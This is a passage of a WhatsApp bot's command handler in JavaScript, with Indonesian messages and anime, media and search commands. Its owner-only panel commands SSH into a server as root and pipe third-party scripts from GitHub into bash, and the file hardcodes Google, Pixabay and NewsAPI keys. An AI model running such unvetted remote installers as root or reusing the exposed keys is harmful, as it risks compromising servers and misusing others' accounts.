const characterInfo = `Karakter: ${character.name}\nAnime: ${character.anime_titles.join(', ')}\nPeran: ${character.role}\nDeskripsi: ${character.about}`;
m.reply(characterInfo);
} catch (err) {
m.reply(`Terjadi kesalahan: ${err.message}`);
}
}
break

case 'animereview': {
try {
if (!text) return m.reply(`Contoh: ${prefix + command} Naruto`);
const response = await axios.get(`https://api.jikan.moe/v4/anime?q=${encodeURIComponent(text)}&limit=1`);
const anime = response.data.data[0];
if (!anime) return m.reply(`Anime dengan judul ${text} tidak ditemukan.`);
const review = anime.synopsis || "Review tidak tersedia.";
m.reply(`Anime: ${anime.title}\nReview: ${review}`);
} catch (err) {
m.reply(`Terjadi kesalahan: ${err.message}`);
}
}
break

case 'animeepisode': {
try {
if (!text) return m.reply(`Contoh: ${prefix + command} Naruto`);
const response = await axios.get(`https://api.jikan.moe/v4/anime?q=${encodeURIComponent(text)}&limit=1`);
const anime = response.data.data[0];
if (!anime) return m.reply(`Anime dengan judul ${text} tidak ditemukan.`);
const episodeList = anime.episodes ? `Episode: ${anime.episodes}` : "Informasi episode tidak tersedia.";
m.reply(`Anime: ${anime.title}\n${episodeList}`);
} catch (err) {
m.reply(`Terjadi kesalahan: ${err.message}`);
}
}
break

case 'animesynopsis': {
try {
if (!text) return m.reply(`Contoh: ${prefix + command} Naruto`);
const response = await axios.get(`https://api.jikan.moe/v4/anime?q=${encodeURIComponent(text)}&limit=1`);
const anime = response.data.data[0];
if (!anime) return m.reply(`Anime dengan judul ${text} tidak ditemukan.`);
const synopsis = anime.synopsis || "Sinopsis tidak tersedia.";
m.reply(`Sinopsis anime ${anime.title}:\n${synopsis}`);
} catch (err) {
m.reply(`Terjadi kesalahan: ${err.message}`);
}
}
break

case 'animetrailer': {
try {
if (!text) return m.reply(`Contoh: ${prefix + command} Naruto`);
const response = await axios.get(`https://api.jikan.moe/v4/anime?q=${encodeURIComponent(text)}&limit=1`);
const anime = response.data.data[0];
if (!anime) return m.reply(`Anime dengan judul ${text} tidak ditemukan.`);
const trailerUrl = anime.trailer_url || "Trailer tidak tersedia.";
m.reply(`Trailer untuk anime ${anime.title}: ${trailerUrl}`);
} catch (err) {
m.reply(`Terjadi kesalahan: ${err.message}`);
}
}
break

case 'animehug': {
try {
await vreact();
const response = await axios.get(`https://api.waifu.pics/sfw/hug`);
const imageUrl = response.data.url;
Line.sendMessage(m.chat, { 
video: { url: imageUrl }, 
caption: `🤗 *Reaksi Pelukan*\n\nDikirim dengan cinta.` 
}, { quoted: m });
} catch (err) {
m.reply(`Terjadi kesalahan: ${err.message}`);
}
}
break

case 'rekanime': {
try {
const response = await axios.get(`https://api.jikan.moe/v4/random/anime`);
const data = response.data.data;
const caption = `🎌 *Rekomendasi Anime*\n\n🎥 *Judul:* ${data.title}\n📅 *Tahun:* ${data.year}\n⭐ *Rating:* ${data.score}\n🎭 *Genre:* ${data.genres.map(g => g.name).join(', ')}\n\n📝 *Sinopsis:* ${data.synopsis}`;
Line.sendMessage(m.chat, { image: { url: data.images.jpg.large_image_url }, caption }, { quoted: m });
} catch (err) {
m.reply(`Terjadi kesalahan: ${err.message}`);
}
}
break

case 'searchmanga': {
try {
if (!text) return m.reply(`Contoh: ${prefix + command} One Piece`);
const response = await axios.get(`https://api.jikan.moe/v4/manga?q=${encodeURIComponent(text)}&limit=1`);
const data = response.data.data[0];
const caption = `📖 *Hasil Pencarian Manga*\n\n📌 *Judul:* ${data.title}\n📆 *Rilis:* ${data.published.string}\n⭐ *Skor:* ${data.score}\n🎭 *Genre:* ${data.genres.map(g => g.name).join(', ')}\n\n📝 *Sinopsis:* ${data.synopsis}\n\n🔗 [Detail Manga](${data.url})`;
Line.sendMessage(m.chat, { image: { url: data.images.jpg.large_image_url }, caption }, { quoted: m });
} catch (err) {
m.reply(`Terjadi kesalahan: ${err.message}`);
}
}
break

case 'searchcharacter': {
try {
if (!text) return m.reply(`Contoh: ${prefix + command} Luffy`);
const response = await axios.get(`https://api.jikan.moe/v4/characters?q=${encodeURIComponent(text)}&limit=1`);
const data = response.data.data[0];
const caption = `🧑 *Hasil Pencarian Karakter*\n\n📌 *Nama:* ${data.name}\n🎭 *Dari Anime:* ${data.anime[0]?.name || 'Tidak diketahui'}\n⭐ *Favorit:* ${data.favorites}\n\n🔗 [Detail Karakter](${data.url})`;
Line.sendMessage(m.chat, { image: { url: data.images.jpg.image_url }, caption }, { quoted: m });
} catch (err) {
m.reply(`Terjadi kesalahan: ${err.message}`);
}
}
break

case 'ebook': {
try {
if (!text) return m.reply(`Contoh: ${prefix + command} Machine Learning`);
const response = await axios.get(`https://openlibrary.org/search.json?q=${encodeURIComponent(text)}`);
let result = '📚 *Ebook Gratis*\n\n';
response.data.docs.slice(0, 5).forEach(book => {
result += `📖 Judul: ${book.title}\n📅 Tahun: ${book.first_publish_year || 'Tidak tersedia'}\nLink: https://openlibrary.org${book.key}\n\n`;
});
m.reply(result);
} catch (err) {
m.reply(`Terjadi kesalahan: ${err.message}`);
}
}
break

case 'book': {
try {
if (!text) return m.reply(`Contoh: ${prefix + command} Harry Potter`);
const response = await axios.get(`https://www.googleapis.com/books/v1/volumes?q=${encodeURIComponent(text)}`);
const book = response.data.items[0].volumeInfo;
if (!book) return m.reply(`Buku dengan judul ${text} tidak ditemukan.`);
const bookInfo = `Buku: ${book.title}\nPenulis: ${book.authors.join(', ')}\nPenerbit: ${book.publisher}\nDeskripsi: ${book.description}\nLink: ${book.infoLink}`;      
m.reply(bookInfo);
} catch (err) {
m.reply(`Terjadi kesalahan: ${err.message}`);
}
}
break

case 'cat': {
try {
const response = await axios.get(`https://api.thecatapi.com/v1/images/search`);
const data = response.data[0];
Line.sendMessage(m.chat, { image: { url: data.url }, caption: `😺 *Kucing Lucu*` }, { quoted: m });
} catch (err) {
m.reply(`Terjadi kesalahan: ${err.message}`);
}
}
break

case 'crypto': {
try {
if (!text) return m.reply(`Contoh: ${prefix + command} bitcoin`);
const response = await axios.get(`https://api.coingecko.com/api/v3/simple/price?ids=${text.toLowerCase()}&vs_currencies=usd`);
const price = response.data[text.toLowerCase()]?.usd;
if (!price) return m.reply('Kripto tidak ditemukan.');
m.reply(`💸 *Harga ${text}:*\n\nUSD ${price}`);
} catch (err) {
m.reply(`Terjadi kesalahan: ${err.message}`);
}
}
break

case 'cerpen': {
try {
if (!text) return m.reply(`Contoh: ${p_c} sejarah`)
let { Cerpen } = require('./lib/general/scrape')
let kep = await Cerpen(text)
let teks = `Judul: ${kep.title}\nAuthor: ${kep.author}\nRilis: ${kep.lolos}\n\n======== *CERITA PENDEK*\n\n${kep.cerita}`
m.reply(teks)
} catch (err) {
m.reply('Terjadi kesalahan: '+err)
console.error('Error:', err)
}
}
break

case 'andro1': {
try {
if (!text) return m.reply(`Contoh: ${p_c} stickman`)
let { Andro1 } = require('./lib/general/scrape')
let results = await Andro1(text)
if (!Array.isArray(results) || results.length === 0) {
return m.reply('Tidak ada hasil ditemukan.')
}
let allResults = results.map(kep => {
return `Judul: ${kep.name}\nDeveloper: ${kep.developer}\nRating: ${kep.rating}\nLink: ${kep.link}\n`
}).join('\n')
let firstImageUrl = results[0].imageUrl;
Line.sendMessage(m.chat, {image: {url: firstImageUrl}, caption: allResults}, {quoted: m})
} catch (err) {
m.reply('Terjadi kesalahan: ' + err)
console.error('Error:', err)
}
}
break

case 'music': {
try {
if (!text) return m.reply(`Contoh: ${prefix + command} Shape of You`);
const response = await axios.get(`https://api.deezer.com/search?q=${encodeURIComponent(text)}`);
const song = response.data.data[0];
if (!song) return m.reply(`Lagu tidak ditemukan.`);
const musicInfo = `
Judul: ${song.title}
Artis: ${song.artist.name}
Album: ${song.album.title}
Link: ${song.link}
`;
m.reply(musicInfo);
} catch (err) {
m.reply(`Terjadi kesalahan: ${err.message}`);
}
}
break

case 'jokes': {
try {
const response = await axios.get('https://official-joke-api.appspot.com/random_joke');
const joke = response.data;
m.reply(`${joke.setup}\n\n${joke.punchline}`);
} catch (err) {
m.reply(`Terjadi kesalahan: ${err.message}`);
}
}
break
case 'google': {
if (!text) return m.reply(`Contoh: ${prefix+command} Line`)
const apiKey = 'AIzaSyAajE2Y-Kgl8bjPyFvHQ-PgRUSMWgBEsSk'
const cx = 'e5c2be9c3f94c4bbb'
const query = encodeURIComponent(text)
const url = `https://www.googleapis.com/customsearch/v1?q=${query}&key=${apiKey}&cx=${cx}`
fetch(url).then(response => response.json()).then(data => {
if (data.items && data.items.length > 0) {
let teks = `Hasil pencarian Google: ${kapital(text)}\n\n`
data.items.forEach(item => {
teks += `• Judul: ${item.title}\n`
teks += `• Deskripsi: ${item.snippet}\n`
teks += `• Link: ${item.link}\n\n`
})
m.reply(teks)
} else {
m.reply('Tidak ada hasil yang ditemukan')
}}).catch(err => {
m.reply('Terjadi kesalahan')
})}
break

case 'appstore':
case 'astore': {
    if (!text) return m.reply(`Contoh: ${p_c} whatsapp`);
    try {
        let loo = await fetchJson(`https://deliriussapi-oficial.vercel.app/search/appstore?q=${text}`);
        let gambar = loo[0]?.image;
        let teks = loo.map((yoo, i) => {
            return `*${i + 1}. ${yoo.title.toUpperCase()}*
Developer: ${yoo.developer}
Rating: ${yoo.rating}
Rilis: ${yoo.released}
Update: ${yoo.updated}
Link Developer: ${yoo.url}`;
        }).join('\n\n');
        await Line.sendMessage(m.chat, { image: { url: gambar }, caption: teks }, { quoted: m });
    } catch (err) {
        console.error(err);
        m.reply(err.toString());
    }
}
break

case 'gimage': {
 if (!text) return m.reply(`Contoh: ${prefix+command} Line`)
 vreact()

 try {
  const backupUrl = `https://api.tioo.eu.org/googleimage?query=${encodeURIComponent(text)}`;
  
  let response = await fetch(backupUrl);
  let data = await response.json();
  let images = data.result;

  if (!images || images.length === 0) {
throw new Error('Gambar tidak ditemukan di widipe.');
  }

  let result1 = images[Math.floor(Math.random() * images.length)];
  let result2 = images[Math.floor(Math.random() * images.length)];

  Line.sendMessage(m.chat, {
image: { url: result1 }, 
caption: `© ${wm}\n\nLink: ${result1}`
  }, { quoted: m });

  Line.sendMessage(m.chat, {
image: { url: result2 }, 
caption: `© ${wm}\n\nLink: ${result2}`
  }, { quoted: m });
  
 } catch (err) {
  try {
const apiKey = '45573590-441d776ae672c55f87af2ebb1'
const url = `https://pixabay.com/api/?key=${apiKey}&q=${encodeURIComponent(text)}&image_type=photo&per_page=5`

let response = await axios.get(url);
let images = response.data.hits;

if (!images || images.length === 0) {
 return m.reply('Gambar tidak ditemukan di kedua sumber.');
}

let result1 = images[Math.floor(Math.random() * images.length)];
let result2 = images[Math.floor(Math.random() * images.length)];

Line.sendMessage(m.chat, {
 image: { url: result1.webformatURL }, 
 caption: `© ${wm}\n\nLink: ${result1.largeImageURL}`
}, { quoted: m });

Line.sendMessage(m.chat, {
 image: { url: result2.webformatURL }, 
 caption: `© ${wm}\n\nLink: ${result2.largeImageURL}`
}, { quoted: m });

  } catch (err) {
m.reply(`Terjadi kesalahan: ${err.toString()}`);
  }
 }
}
break

case 'yts':
case 'ytsearch': {
    if (!text) return reply(`Contoh : ${prefix + command} story wa anime`);
    vreact();
    try {
        const result = await search(text); 

        if (!result || result.videos.length === 0) {
            return reply('Tidak ditemukan video yang relevan.');
        }

        const uii = result.videos;
        let ytscard = [];
        let teks = `\n${uii[0].title}\n\n*Video ID:* ${uii[0].videoId}\n*Views:* ${uii[0].views}\n*Duration:* ${uii[0].duration}\n*Upload At:* ${uii[0].author.name}\n\n`;

        let no = 1;
        for (let i of uii) {
            if (i.url) {
                ytscard.push({
                    title: `${no++}. ${i.title}`,
                    rows: [
                        {
                            header: `[ ${i.duration} ] Download Audio`,
                            title: `ID: ${i.videoId}`,
                            description: `Link: ${i.url}`,
                            id: `.audio ${i.url}`,
                        },
                        {
                            header: `[ ${i.duration} ] Download Video`,
                            title: `ID: ${i.videoId}`,
                            description: `Link: ${i.url}`,
                            id: `.video ${i.url}`,
                        }
                    ]
                });
            }
        }

        let button = [
            {
                "name": "single_select",
                "buttonParamsJson": `{\n  title: 'Search 🔎',\n  sections: ${JSON.stringify(ytscard)}\n}`
            }
        ];

        let buffer = await getBuffer(uii[0].thumbnail);
        Line.sendButtonImage(m.chat, "*乂 YOUTUBE SEARCH*", teks, buffer, button, m);

    } catch (err) {
        m.reply(`Terjadi kesalahan: ${err.message || err}`);
    }
    break;
}
break;

case 'play': {
  if (!text) return m.reply(`Contoh: ${p_c} aku yang tersakiti`)
  try {
    vreact()
    const results = await search(text)
    const { title, url, author, duration, thumbnail } = results.videos[0] 
    const body = `• Judul: ${title}\n` +
      `• Channel: ${author}\n` +
      `• Durasi: ${duration}\n` +
      `• Link: ${url}`

    let buffer = await getBuffer(thumbnail)

    let ytscard = [{
      title: 'Pilih Opsi:',
      rows: [
        {
          header: '[Video] Download Video',
          title: `ID: ${url.split('v=')[1]}`,
          description: `Link: ${url}`,
          id: `.ytmp4 ${url}`
        },
        {
          header: '[Audio] Download Audio',
          title: `ID: ${url.split('v=')[1]}`,
          description: `Link: ${url}`,
          id: `.ytmp3 ${url}`
        }
      ]
    }];

    let button = [
      {
        "name": "single_select",
        "buttonParamsJson": `{\n  title: 'Youtube Opsi',\n  sections: ${JSON.stringify(ytscard)}\n}`
      }
    ];

    Line.sendButtonImage(m.chat, `YOUTUBE - PLAY\n`, body, buffer, button, m)
  } catch (err) {
    m.reply(`Terjadi kesalahan: ${err.message}`)
  }
}
break;

case 'video': {
  if (!m.quoted) return m.reply('Kutip pesan hasil dari fitur play.');
  vreact();

  let urls = quoted.text.match(/https:\/\/youtube\.com\/watch\?v=[\w-]{11}/gi);

  if (!urls) return m.reply('URL tidak valid atau tidak ditemukan dalam pesan yang dikutip.');

  await downloadMp4(urls[0]);
}
break;

case 'audio': {
  if (!m.quoted) return m.reply('Kutip pesan hasil dari fitur play.');
  vreact();

  let urls = quoted.text.match(/https:\/\/youtube\.com\/watch\?v=[\w-]{11}/gi);

  if (!urls) return m.reply('URL tidak valid atau tidak ditemukan dalam pesan yang dikutip.');

  await downloadMp3(urls[0]);
}
break;

case 'ytvideo':
case 'ytmp4': {
  if (!text) return m.reply(`Contoh: ${p_c} linknya`)
  if (!text.match('youtu')) return m.reply('Harus berupa link youtube!')
  await vreact()
  downloadMp4(text)
}
break

case 'ytaudio':
case 'ytmp3': {
  if (!text) return m.reply(`Contoh: ${p_c} linknya`)
  if (!text.match('youtu')) return m.reply('Harus berupa link youtube!')
  await vreact()
  downloadMp3(text)
}
break

case 'ttsearch':
case 'tiktoksearch': {
try {
if (!text) return m.reply(`Contoh: ${prefix+command} christy jkt48`)
await vreact()
let serach = await tiktokSearchVideo(text)
let teks = '*TIKTOK - SEARCH*\n\n'
let no = 1
for (let i of serach.videos) {
let sut = await JSON.stringify(i.author)
teks += `• No Urutan: ${no++}\n• Capt: ${i.title}\n• Username: ${i.author.unique_id}\n• Nickname: ${i.author.nickname}\n• Durasi: ${toRupiah(i.duration)} detik\n• Like: ${toRupiah(i.digg_count)}\n• Komentar: ${toRupiah(i.comment_count)}\n• Share: ${toRupiah(i.share_count)}\n• Url: https://www.tiktok.com/@${i.author.unique_id}/video/${i.video_id}\n\n\n`
}
Line.sendMessage(m.chat, { video: { url: `https://tikwm.com${serach.videos[0].play}` },  caption: teks }, { quoted: m })
} catch(err) {
m.reply(`Terjadi kesalahan`);
}}
break

case 'ttget': {
try {
if (!text) return m.reply(`Contoh: ${prefix+command} 1`)
if (!m.quoted) return m.reply('Reply pesan ttsearch bot!')
let urls = quoted.text.match(new RegExp(/(http(?:s)?:\/\/)?(?:www\.)?(?:tiktok\.com\/@[^\/]+\/video\/(\d+))|(http(?:s)?:\/\/)?vm\.tiktok\.com\/([^\s&]+)|(http(?:s)?:\/\/)?vt\.tiktok\.com\/([^\s&]+)/, 'gi'))
if (!urls) return m.reply(`Mungkin pesan yang kamu reply tidak mengandung hasil ttsearch`)
await vreact()
let anu = await fetchJson(`https://api.vreden.my.id/api/tiktok?url=${urls[text - 1]}`)
let c = 0
for (let imgs of anu.result.data) {
if (imgs.type == "nowatermark") {
Line.sendMessage(m.chat, {video: {url: imgs.url }, caption: `© ${wm}`}, {quoted: m})
} else if (imgs.type == "photo") {
if (c == 0) await Line.sendMessage(m.chat, { image: { url: imgs.url }, caption: `© ${wm}\n\n${m.isGroup ? 'Sisa foto dikirim di privat chat' : ""}` }, { quoted: m })
else await Line.sendMessage(m.sender, {image: {url: imgs.url }}, {quoted: m })
c += 1
await sleep(2000)
}}
} catch(err) {
try {
const data = await tiktokdl(urls[text - 1])
console.log(data)
Line.sendMessage(m.chat, { video: { url: data.video}, caption: `© ${wm}`}, {quoted: m})
} catch(err) {
m.reply('Terjadi kesalahan')
}}
}
break

case 'spotifys':
case 'spotifysearch': {
  if (!text) return m.reply(`Contoh: ${p_c} aku yang tersakiti`)
  let results = await searchSpotifyTracks(text);
  if (!results || results.length === 0) return m.reply('Lagu tidak ditemukan.')
  let firstResult = results[0];
  let spotifyAPI = await fetchJson(`https://api.vreden.my.id/api/spotify?url=${firstResult.external_urls.spotify}`)
  await vreact()
  let teks = `*SPOTIFY - SEARCH*\n\n`
  for (let track of results) {
    teks += `*• Title:* ${track.name}\n`
    teks += `*• Artist:* ${track.artists.map(artist => artist.name).join(', ')}\n`
    teks += `*• Link:* ${track.external_urls.spotify}\n\n`
  }
  Line.sendMessage(m.chat, {
    image: {
      url: spotifyAPI.result.cover
    },
    caption: teks
  }, {
    quoted: m
  })
}
break

case 'news': {
 if (!text) return m.reply(`Contoh: ${prefix+command} teknologi`);

 Line.sendMessage(m.chat, { react: { text: `📰`, key: m.key } });
 
 try {
  let anu = await fetchJson(`https://newsapi.org/v2/everything?q=${encodeURIComponent(text)}&apiKey=3cda4de297d2474ba036b3529265ca49`);
  let articles = anu.articles;
  if (!articles.length) return m.reply('Tidak ada berita yang ditemukan.');

  let result = articles[Math.floor(Math.random() * articles.length)];
  let newsContent = `*${result.title}*\n\n${result.description}\n\n[Read more](${result.url})`;
  
  Line.sendMessage(m.chat, { text: newsContent }, { quoted: m });
 } catch (err) {
  m.reply('Terjadi kesalahan saat mencari berita.');
 }
}
break

case 'wiki': {
 if (!text) return m.reply(`Contoh: ${prefix+command} JavaScript`);

 Line.sendMessage(m.chat, { react: { text: `📚`, key: m.key } });
 
 try {
  let anu = await fetchJson(`https://en.wikipedia.org/w/api.php?action=query&format=json&titles=${encodeURIComponent(text)}&prop=extracts&exintro&explaintext`);
  let page = Object.values(anu.query.pages)[0];
  if (!page.extract) return m.reply('Artikel tidak ditemukan.');

  let wikiContent = `*${page.title}*\n\n${page.extract}`;
  
  Line.sendMessage(m.chat, { text: wikiContent }, { quoted: m });
 } catch (err) {
  m.reply('Terjadi kesalahan saat mencari artikel Wikipedia.');
 }
}
break

// === Ptero Menu

case 'cnode':
case 'createnode': {
    if (!isOwner) return onlyOwn()    
    let t = text.split(',');
    if (t.length < 2) return m.reply(`Contoh: ${prefix+command} ipvps,password,domainnode,ramvps`) 
    let ipvps = t[0];
    let passwd = t[1];
    let domainnode = t[2];
    let ramvps = t[3];
    const connSettings = {
host: ipvps,
port: '22',
username: 'root',
password: passwd
    };

    const comnd = 'bash <(curl https://raw.githubusercontent.com/riooxdzz/installpanell/main/sukii/install.sh)'
    const conn = new Client();
 
    conn.on('ready', () => {
isSuccess = true;
m.reply('Memulai membuat node & location');

conn.exec(comnd, (err, stream) => {
    if (err) throw err;
    stream.on('close', (code, signal) => {
console.log('Stream closed with code ' + code + ' and signal ' + signal);
m.reply('Node dan location telah ditambahkan, silahkan tambahkan allocation manual & ambil token configure')
conn.end();
    }).on('data', (data) => {
    stream.write('Line\n');
    stream.write('4\n');
stream.write('SGP\n');
stream.write('AutoCnode Line\n');
stream.write(`${domainnode}\n`)
stream.write('NODES\n');
stream.write(`${ramvps}\n`);
stream.write(`${ramvps}\n`);
stream.write('1\n');
console.log('STDOUT: ' + data);
    }).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
    });
});
    }).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Password atau IP tidak valid.');
    }).connect(connSettings);
   }
break

case 'installpanel': {
    if (!isOwner) return onlyOwn()
    let t = text.split(',');
    if (t.length < 5) return m.reply(`Contoh: ${prefix+command} ipvps,password,domainpnl,domainnode,ramvps Contoh 80000 8gb`);
    let ipvps = t[0];
    let passwd = t[1];
    let subdomain = t[2];
    let domainnode = t[3];
    let ramvps = t[4];
    const connSettings = {
host: ipvps,
port: '22',
username: 'root',
password: passwd
    };
    let password = generateRandomPassword();
    const commandPanel = 'bash <(curl -s https://pterodactyl-installer.se)';
    const commandWings = 'bash <(curl -s https://pterodactyl-installer.se)';
    const conn = new Client();

    conn.on('ready', () => {
m.reply('Proses penginstalan wings sedang diproses, mohon tunggu 1-5 menit');
conn.exec(commandPanel, (err, stream) => {
    if (err) throw err;
    stream.on('close', (code, signal) => {
console.log('Panel installation stream closed with code ' + code + ' and signal ' + signal);
installWings(conn, domainnode, subdomain, password, ramvps);
    }).on('data', (data) => {
handlePanelInstallationInput(data, stream, subdomain, password);
    }).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
    });
});
    }).connect(connSettings);

    async function installWings(conn, domainnode, subdomain, password, ramvps) {
m.reply('Proses penginstalan wings sedang diproses, mohon tunggu 1-5 menit');
conn.exec(commandWings, (err, stream) => {
    if (err) throw err;
    stream.on('close', (code, signal) => {
console.log('Wings installation stream closed with code ' + code + ' and signal ' + signal);
createNode(conn, domainnode, ramvps, subdomain, password);
    }).on('data', (data) => {
handleWingsInstallationInput(data, stream, domainnode, subdomain);
    }).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
    });
});
    }

    async function createNode(conn, domainnode, ramvps, subdomain, password) {
const comnd = 'bash <(curl https://raw.githubusercontent.com/riooxdzz/installpanell/main/sukii/install.sh)';
m.reply('Memulai membuat node & location');

conn.exec(comnd, (err, stream) => {
    if (err) throw err;
    stream.on('close', (code, signal) => {
console.log('Node creation stream closed with code ' + code + ' and signal ' + signal);
conn.end();
sendPanelData(subdomain, password);
    }).on('data', (data) => {
handleNodeCreationInput(data, stream, domainnode, ramvps);
    }).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
    });
});
    }

    function sendPanelData(subdomain, password) {
m.reply(`*DATA PANEL ANDA*\n\nUsername: admin\n*Password:* ${password}\nLogin: ${subdomain}\n\nNote: Semua instalasi telah selesai, silahkan buat allocation dinode yang dibuat oleh bot dan ambil token configuration dan ketik .startwings token\n*HARAP TUNGGU 1-5 MENIT BIAR WEB BISA DI BUKA*`);
    }

    function handlePanelInstallationInput(data, stream, subdomain, password) {
if (data.toString().includes('Input')) {
    stream.write('0\n');
}
if (data.toString().includes('Input')) {
    stream.write('\n');
}
if (data.toString().includes('Input')) {
    stream.write('\n');
}
if (data.toString().includes('Input')) {
    stream.write('1248\n');
}
if (data.toString().includes('Input')) {
    stream.write('Asia/Jakarta\n');
}
if (data.toString().includes('Input')) {
    stream.write('admin@gmail.com\n');
}
if (data.toString().includes('Input')) {
    stream.write('admin@gmail.com\n');
}
if (data.toString().includes('Input')) {
    stream.write('admin\n');
}
if (data.toString().includes('Input')) {
    stream.write('adm\n');
}
if (data.toString().includes('Input')) {
    stream.write('adm\n');
}
if (data.toString().includes('Input')) {
    stream.write(`${password}\n`);
}
if (data.toString().includes('Input')) {
    stream.write(`${subdomain}\n`);
}
if (data.toString().includes('Input')) {
    stream.write('y\n');
}
if (data.toString().includes('Input')) {
    stream.write('y\n');
}
if (data.toString().includes('Input')) {
    stream.write('y\n');
}
if (data.toString().includes('Input')) {
    stream.write('y\n');
}
if (data.toString().includes('Input')) {
    stream.write('yes\n');
}
if (data.toString().includes('Please read the Terms of Service')) {
    stream.write('A\n');
}
if (data.toString().includes('Input')) {
    stream.write('\n');
}
if (data.toString().includes('Input')) {
    stream.write('1\n');
}
console.log('STDOUT: ' + data);
    }

    function handleWingsInstallationInput(data, stream, domainnode, subdomain) {
if (data.toString().includes('Input')) {
    stream.write('1\n');
}
if (data.toString().includes('Input')) {
    stream.write('y\n');
}
if (data.toString().includes('Input')) {
    stream.write('y\n');
}
if (data.toString().includes('Input')) {
    stream.write('y\n');
}
if (data.toString().includes('Input')) {
    stream.write(`${subdomain}\n`);
}
if (data.toString().includes('Input')) {
    stream.write('y\n');
}
if (data.toString().includes('Input')) {
    stream.write('user\n');
}
if (data.toString().includes('Input')) {
    stream.write('1248\n');
}
if (data.toString().includes('Input')) {
    stream.write('y\n');
}
if (data.toString().includes('Input')) {
    stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Input')) {
    stream.write('y\n');
}
if (data.toString().includes('Input')) {
    stream.write('admin@gmail.com\n');
}
if (data.toString().includes('Input')) {
    stream.write('y\n');
}
console.log('STDOUT: ' + data);
    }

    function handleNodeCreationInput(data, stream, domainnode, ramvps) {
stream.write('Line\n');
stream.write('4\n');
stream.write('SGP\n');
stream.write('AutoCnode Line\n');
stream.write(`${domainnode}\n`);
stream.write('NODES\n');
stream.write(`${ramvps}\n`);
stream.write(`${ramvps}\n`);
stream.write('1\n');
console.log('STDOUT: ' + data);
}}
break

case 'uninstallpanel': {
    if (!isOwner) return onlyOwn()
    let t = text.split(',');
    if (t.length < 2) return m.reply(`Contoh: ${prefix+command} ipvps,password`);
    let ipvps = t[0].trim();
    let passwd = t[1].trim();
    const connSettings = {
host: ipvps,
port: '22',
username: 'root',
password: passwd
    };
    const comnd = 'bash <(curl -s https://pterodactyl-installer.se)';
    const conn = new Client();
    let isSuccess = false;
    conn.on('ready', () => {
m.reply('Proses uninstall panel sedang diproses, mohon tunggu 20 detik');
conn.exec(comnd, (err, stream) => {
    if (err) throw err;
    stream.on('close', (code, signal) => {
console.log('Stream closed with code ' + code + ' and signal ' + signal);
conn.end();
    }).on('data', (data) => {
console.log('STDOUT: ' + data);
if (data.toString().includes('Input')) {
    if (data.toString().includes('6')) {
stream.write('6\n');
    } else if (data.toString().includes('y/n')) {
stream.write('y\n');
    } else {
stream.write('\n');
    }
}
    }).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
    });
});
    }).connect(connSettings);
    await new Promise(resolve => setTimeout(resolve, 20000));
    if (isSuccess) {
    m.reply('Sukses uninstall panel kamu');
}}
break

case 'startwings':
case 'configurewings': {
    if (!isOwner) return onlyOwn()  
    let t = text.split(',');
    if (t.length < 2) return m.reply(`Contoh: ${prefix+command} ipvps,password,token token configuration`)  
    let ipvps = t[0];
    let passwd = t[1];
    let token = t[2];
    const connSettings = {
host: ipvps,
port: '22',
username: 'root',
password: passwd
    };
    const comnd = 'bash <(curl https://raw.githubusercontent.com/riooxdzz/installpanell/main/sukii/install.sh)'
    const conn = new Client();
 
    conn.on('ready', () => {
isSuccess = true;
m.reply('Proses configure wings')

conn.exec(comnd, (err, stream) => {
    if (err) throw err;
    stream.on('close', (code, signal) => {
console.log('Stream closed with code ' + code + ' and signal ' + signal);
m.reply('Sukses start wings dipanel kamu');
conn.end();
    }).on('data', (data) => {
    stream.write('Line\n');
stream.write('3\n');
stream.write(`${token}\n`)
console.log('STDOUT: ' + data);
    }).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
    });
});
    }).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Password atau IP tidak valid');
    }).connect(connSettings);
   }
break

case 'itema1': {
    if (!isOwner) return onlyOwn();
    
    let t = text.split(',');
    if (t.length < 2) return m.reply(`Contoh: ${prefix+command} ipvps,password`)
    
    let ipvps = t[0];
    let passwd = t[1];
    
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    function Linecodes(opece) {
        return opece.split('\\x').slice(1).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
    }

    const cmmnd = 'bash <(curl https://raw.githubusercontent.com/gitfdil1248/thema/main/install.sh)'

    const conn = new Client();
    let isSuccess = false;

    conn.on('ready', () => {
        isSuccess = true;
        m.reply('Proses, mohon tunggu 5-10 menit');
        
        conn.exec(cmmnd, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                m.reply('Sukses install tema. Silahkan dicek')
                conn.end();
            }).on('data', (data) => {
                stream.write('0x1e7b2;\n');
                stream.write('1\n');
                stream.write('1\n');
                stream.write('y\n');
                stream.write('x\n');
                
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        m.reply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
   
   setTimeout(() => {
        if (isSuccess) {
            m.reply('Sukses install tema.');
        }
    }, 300000);
   
}
break

case 'itema2': {
    if (!isOwner) return onlyOwn();
    
    let t = text.split(',');
    if (t.length < 2) return m.reply(`Contoh: ${prefix+command} ipvps,password`)
    
    let ipvps = t[0];
    let passwd = t[1];
    
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };
    
    function Linecodes(opece) {
        return opece.split('\\x').slice(1).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
    }

    const cmmnd = 'bash <(curl https://raw.githubusercontent.com/gitfdil1248/thema/main/install.sh)'

    const conn = new Client();
    let isSuccess = false;

    conn.on('ready', () => {
        isSuccess = true;
        m.reply('Proses, mohon tunggu 5-10 menit');
        
        conn.exec(cmmnd, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                m.reply('Sukses install tema. Silahkan dicek')
                conn.end();
            }).on('data', (data) => {
                stream.write('0x1e7b2;\n');
                stream.write('1\n');
                stream.write('2\n');
                stream.write('yes\n');
                stream.write('x\n');
                
